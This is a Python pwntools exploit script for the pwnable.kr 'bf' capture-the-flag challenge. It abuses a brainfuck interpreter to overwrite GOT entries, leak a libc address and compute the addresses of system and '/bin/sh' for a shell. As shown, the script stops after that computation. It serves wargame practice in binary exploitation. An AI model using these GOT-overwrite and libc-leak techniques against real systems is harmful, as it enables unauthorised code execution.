import struct
from pwn import *

BF_LIBC_PATH = "bf_libc.so"

GOT_ADDRESSES = {"getchar": 0x804a00c, "fgets": 0x804a010, "memset": 0x804a02c,
                 "putchar": 0x0804a030}

P_ADDRESS = 0x0804a0a0

START_ADDRESS = 0x80484e0

# The address that the got getchar entry points to.
GETCHAR_ADDRESS = 0x8048446


def move_addresses(address1: int, address2: int, direction: str) -> bytes:
    return (direction * (address2 - address1)).encode()


def change_address_payload(address1: int, address2: int) -> bytes:
    return "+".encode() * (address2 - address1)


def main():
    """
    Find the offsets of putchar , /bin/sh/ offset and system.
    """
    libc = ELF(BF_LIBC_PATH)
    system_offset = libc.symbols["system"]
    log.info(f"System libc offset : {hex(system_offset)}")
    putchar_offset = libc.symbols["putchar"]
    log.info(f"Putchar libc offset : {hex(putchar_offset)}")
    bin_sh_offset = 0x15bb2b
    log.info(f"/bin/sh libc offset : {hex(bin_sh_offset)}")

    """
    Sets ups the connections and the payload.
    """
    payload = b""

    shell = remote("pwnable.kr", 9001)

    """"
    Turns the make the got of getchar point to _start so when we use , it will restart the program.
    """
    payload += move_addresses(GOT_ADDRESSES["getchar"], P_ADDRESS, "<")
    payload += change_address_payload(GETCHAR_ADDRESS, START_ADDRESS)

    """
    Leaks the address of libc by calling putchar using . and then printing the loaded address.
    Then runs the program again after we got the leaked libc address.
    """
    payload += move_addresses(GOT_ADDRESSES["getchar"], GOT_ADDRESSES["putchar"], ">")
    payload += b"..>.>.>."

    response = shell.recvuntil(b"type some brainfuck instructions except [ ]\n")
    log.info(f"Response: {response}")

    # Calls the overwritten putchar to run the program again after we know the libc address.
    payload += b','

    shell.sendline(payload)
    response = shell.recvuntil(b"type some brainfuck instructions except [ ]\n")
    leaked_libc_address = struct.unpack("I", response[1:5])[0]

    log.info(f"Uncut response: {response}")
    response = response[5:]
    log.info(f"Cut response {response}")
    log.info(f"Leaked libc : {hex(leaked_libc_address)}")

    """
    Uses the leaked address of the libc to find the base address of libc and the address of system.
    """
    base_libc_address = leaked_libc_address - putchar_offset
    log.info(f"Base libc address {hex(base_libc_address)}")

    system_libc_address = base_libc_address + system_offset
    log.info(f"System libc address {hex(system_libc_address)}")

    bin_sh_libc_address = base_libc_address + bin_sh_offset
    log.info(f"/bin/sh libc address {hex(bin_sh_libc_address)}")

    print(payload)


if __name__ == "__main__":
    main()
